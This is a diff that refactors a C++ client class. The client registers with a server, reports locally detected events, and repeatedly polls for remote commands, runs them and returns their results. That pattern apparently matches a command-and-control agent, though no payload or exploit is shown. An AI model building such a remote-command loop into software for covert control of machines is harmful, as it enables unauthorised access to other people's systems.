@@ -1,8 +1,6 @@
 #include <stdexcept>
 #include <chrono>
 #include <thread>
-#include <iostream>
-#include <thread>
 
 #include <httplib.h>
 
@@ -10,24 +8,23 @@
 #include "Protocol/BasicRequest.h"
 #include "Protocol/InstallClientResponse.h"
 #include "Protocol/GetCommandResponse.h"
-#include "Commands/PopupCommand.h"
 #include "CommandHandlers/CommandHandlerFactory.h"
 #include "WinUtils.h"
 using namespace xp_collector;
 
-xp_collector::Client::Client(
+Client::Client(
 	std::unique_ptr<ICommunicator> communicator,
 	std::unique_ptr<IClientStorage> storage,
 	std::unordered_map<std::unique_ptr<IEvent>, std::vector<std::unique_ptr<IEventHandler>>>&& events,
 	std::unique_ptr<ILogger> logger)
 	: m_communicator(std::move(communicator))
-	, m_storage(std::move(storage))
-	, m_events(std::move(events))
-	, m_logger(std::move(logger))
+	  , m_storage(std::move(storage))
+	  , m_logger(std::move(logger))
+	  , m_events(std::move(events))
 {
 }
 
-void xp_collector::Client::run()
+void Client::run()
 {
 	if (!is_installed()) {
 		while (true) {
@@ -36,7 +33,10 @@ void xp_collector::Client::run()
 				break;
 			}
 			catch (const std::exception& ex) {
-				m_logger->log(std::string("Couldn't install, sleeping for " + std::to_string(INSTALLATION_RETRY_SLEEP_DURATION) + " seconds and trying again... Error: ") + ex.what());
+				m_logger->log(
+					std::string(
+						"Couldn't install, sleeping for " + std::to_string(INSTALLATION_RETRY_SLEEP_DURATION) +
+						" seconds and trying again... Error: ") + ex.what());
 			}
 			std::this_thread::sleep_for(std::chrono::seconds(INSTALLATION_RETRY_SLEEP_DURATION));
 		}
@@ -46,16 +46,17 @@ void xp_collector::Client::run()
 	m_logger->log("Running with client ID: " + m_client_id);
 
 	for (const auto& item : m_events) {
-		std::thread event_detection_thread(&Client::event_detection_loop, this, std::ref(item.first), std::ref(item.second));
+		std::thread event_detection_thread(&Client::event_detection_loop, this, std::ref(item.first),
+		                                   std::ref(item.second));
 		event_detection_thread.detach();
 	}
 
 	execute_commands_loop();
 }
 
-void xp_collector::Client::install()
+void Client::install() const
 {
-	BasicRequest request({ RequestType::InstallClient, "" });
+	BasicRequest request({RequestType::InstallClient, ""});
 
 	const ResponseInfo res = m_communicator->send_request(request.pack());
 	if (httplib::OK_200 != res.get_status()) {
@@ -65,24 +66,23 @@ void xp_collector::Client::install()
 	m_storage->store(CLIENT_ID_STORAGE_NAME, InstallClientResponse().unpack(res).get_client_id());
 }
 
-bool xp_collector::Client::is_installed()
+bool Client::is_installed() const
 {
 	return m_storage->has_field(CLIENT_ID_STORAGE_NAME);
 }
 
-void xp_collector::Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect, const std::vector<std::unique_ptr<IEventHandler>>& handlers)
+void Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect,
+                                  const std::vector<std::unique_ptr<IEventHandler>>& handlers) const
 {
 	while (true) {
-		const auto det = event_to_detect->is_detected();
-		if (EventType::NotDetected != det) {
+		if (const auto event_info = event_to_detect->is_detected(); EventType::NotDetected != event_info->get_type()) {
 			for (const auto& handler : handlers) {
-				const auto& request = handler->handle(det, m_client_id);
-				if (nullptr != request) {
+				if (const auto& request = handler->handle(*event_info, m_client_id); nullptr != request) {
 					try {
 						m_communicator->send_request(request->pack());
 					}
 					catch (const std::exception& ex) {
-						m_logger->log(std::string("Couldn't send event handler pruduct request. Error: ") + ex.what());
+						m_logger->log(std::string("Couldn't send event handler product request. Error: ") + ex.what());
 					}
 				}
 			}
@@ -91,7 +91,7 @@ void xp_collector::Client::event_detection_loop(const std::unique_ptr<IEvent>& e
 	}
 }
 
-void xp_collector::Client::execute_commands_loop()
+void Client::execute_commands_loop()
 {
 	m_logger->log("Starting main loop of command fetching");
 	while (true) {
@@ -116,24 +116,25 @@ void xp_collector::Client::execute_commands_loop()
 	}
 }
 
-void xp_collector::Client::handle_command(std::shared_ptr<BasicCommand> command)
+void Client::handle_command(std::shared_ptr<BasicCommand> command) const
 {
-	m_logger->log("Handling '" + to_string(command->get_command_type()) + "' command with id " + command->get_command_id() + " in a different thread!");
+	m_logger->log(
+		"Handling '" + to_string(command->get_command_type()) + "' command with id " + command->get_command_id() +
+		" in a different thread!");
 
 	const auto handler = CommandHandlerFactory::create(*command, m_client_id);
 	const auto request_to_make = handler->handle(command); // should usually be a ReturnProduct request
-	const auto res = m_communicator->send_request(request_to_make->pack()); // expect 200 from ReturnProduct
-	if (httplib::OK_200 != res.get_status()) {
+	if (const auto res = m_communicator->send_request(request_to_make->pack()); httplib::OK_200 != res.get_status()) {
 		m_logger->log("Error sending ReturnProduct. Response: " + res.get_body());
 		throw std::runtime_error("Couldn't ReturnProduct. Status code: " + std::to_string(res.get_status()));
 	}
 }
 
-std::shared_ptr<BasicCommand> xp_collector::Client::get_command()
+std::shared_ptr<BasicCommand> Client::get_command() const
 {
 	m_logger->log("Sending GetCommand request to server");
 
-	BasicRequest request({ RequestType::GetCommand, m_client_id });
+	BasicRequest request({RequestType::GetCommand, m_client_id});
 	const auto res = m_communicator->send_request(request.pack());
 	if (httplib::OK_200 != res.get_status()) {
 		m_logger->log("Error sending GetCommand. Response: " + res.get_body());
